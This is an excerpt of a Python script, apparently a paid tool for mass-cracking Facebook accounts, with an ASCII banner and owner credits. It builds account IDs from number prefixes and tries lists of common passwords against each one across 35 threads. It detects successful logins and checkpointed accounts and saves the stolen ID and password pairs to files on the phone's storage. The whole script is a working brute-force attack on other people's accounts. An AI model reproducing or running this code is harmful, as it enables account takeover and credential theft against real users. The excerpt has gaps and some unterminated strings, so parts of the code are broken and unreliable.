...
try:
	prox= requests.get('https://github.com/siyamffofficial/Random-cloning-paid/blob/main/Approve.txt').text
...
logo=("""\033[1;97m
 ...
 ad88888ba   88  8b        d8    db         88b           d88  
d8"     "8b  88   Y8,    ,8P    d88b        888b         d888  
Y8,          88    Y8,  ,8P    d8'`8b       88`8b       d8'88  
`Y8aaaaa,    88     "8aa8"    d8'  `8b      88 `8b     d8' 88  
  `"""""8b,  88      `88'    d8YaaaaY8b     88  `8b   d8'  88  
        `8b  88       88    d8""""""""8b    88   `8b d8'   88  
Y8a     a8P  88       88   d8'        `8b   88    `888'    88  
 "Y88888P"   88       88  d8'          `8b  88     `8'     88  
                                                               
                                                               
                                           
\33[1;37m----------------------------------------------
→   Owner      :  Siyam Ahmed
→   Facebook   :  Siyam Ahmed
→   Github     :  siyamffofficial 
→   Tool Type  :  \x1b[1;91mpaid
\x1b[1;97m→   Version    :  9.0
\33[1;37m----------------------------------------------""")
def linex():
	print('\33[1;37m----------------------------------------------')
loop = 0
...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/profile.php?id=100091226546741');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[SIYAM-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/SIYAM-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[SIYAM-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/SIYAM.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def random_number3():
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode,'khankhan','khan12','khan1122','khan123456','janjan','jan12345','khan1122','khan12','freefirelover12','freefire','pubglover123','free fire lover','sabbir@10','khan@10','saddam@10','arif@10','sabbir@2004','sabbir@20','sabbir2004','sabbir@40]
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
...
def random_number4():
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'khan786','khan44','khan12','khan1122','khan123456','janjan','jan12345','khan1122','khan12','freefirelover12','freefire','pubglover123','free fire lover','sabbir@10','khan@10','saddam@10','arif@10','sabbir@2004','sabbir@20','sabbir2004','sabbir@40]
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
...
def random_number5():
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'khan123456','janjan','jan12345','khan1122','khan12','freefirelover12','freefire','pubglover123','free fire lover','sabbir@10','khan@10','saddam@10','arif@10','sabbir@2004','sabbir@20','sabbir2004','sabbir@40]
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
...
def random_number6():
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'baloch','malik12','baloch12','baloch12345','malik12345','khan123456','janjan','jan12345','khan1122','khan12','freefirelover12','freefire','pubglover123','free fire lover','sabbir@10','khan@10','saddam@10','arif@10','sabbir@2004','sabbir@20','sabbir2004','sabbir@40]
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
